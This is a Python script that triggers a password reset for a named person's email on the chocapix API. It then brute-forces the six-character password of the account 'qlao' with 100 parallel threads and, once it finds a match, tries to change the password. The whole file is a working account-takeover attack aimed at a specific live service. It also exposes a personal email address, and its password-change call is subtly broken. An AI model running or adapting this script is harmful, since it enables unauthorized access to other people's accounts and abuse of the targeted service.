import requests
import time
import sys
from threading import Thread
import threading
import string
import random
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry


##### INFO TO CHANGE
new_password = "Hello"
nb_threads = 100
##### INFO TO CHANGE

alphabet = "1234567890azertyuiopqsdfghjklmwxcvbn"
count = 0

mutex = threading.Lock()

def create_session():
    s = requests.Session()
    retry = Retry(connect=3, backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    return s

def reset_password(s: requests.sessions.Session, email: str):
    try :
        payload = {"email" : email}
        reset_request = s.post("https://api.chocapix.binets.fr/reset-password/", json = payload, allow_redirects = True )
        print(reset_request.text)
        print("Password reset !\n")
    except Exception :
        print("Password reset problem...")
        sys.exit(1)



def brute_force(alphabet: str, new_password: str):
    """
    possible_chance = len(alphabet)**6
    count = 0
    for a in alphabet :
        for b in alphabet :
            for c in alphabet :
                for d in alphabet :
                    for e in alphabet :
                        for f in alphabet :
                            count += 1
                            string_test = a + b + c + d + e + f
                            login = {'username' : "qlao", "password" : string_test}
                            result = s.post("https://api.chocapix.binets.fr/api-token-auth/", data = login, allow_redirects = True )
                            if "token" in result.text :
                                print("Password found : {}", string_test)
                                token = result.text.split('"')[3]
                                payload = {"old_password": string_test , "password" : new_password}
                                result = s.put("https://api.chocapix.binets.fr/user/change_password/", data = login, allow_redirects = True )

                                return

                            print(string_test)
    """

    while (1) :
        try :
            string_test = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
            login = {'username' : "qlao", "password" : string_test}
            result = s.post("https://api.chocapix.binets.fr/api-token-auth/", data = login, allow_redirects = True )
            with mutex :
                global count
                count += 1
            if count%1000 == 0:
                print("Count :", count)
            if "token" in result.text :
                with mutex :
                    print("Password found : {}", string_test)
                    token = result.text.split('"')[3]
                    payload = {"old_password": string_test , "password" : new_password}
                    result = s.put("https://api.chocapix.binets.fr/user/change_password/", data = login, allow_redirects = True )
                    print("Password has been successfully changed to '{}' in {} s".format(new_password, time.time() - start) )
                    sys.exit(1)
        except Exception :
            pass




if __name__ == "__main__":

    start = time.time()

    s = create_session()
    reset_password(s, email = "quentin.lao@polytechnique.edu")

    threads = [Thread(target=brute_force, args=(alphabet,new_password,)) for i in range(nb_threads)]

    for thread in threads :
        thread.start()

    for thread in threads :
        thread.join()
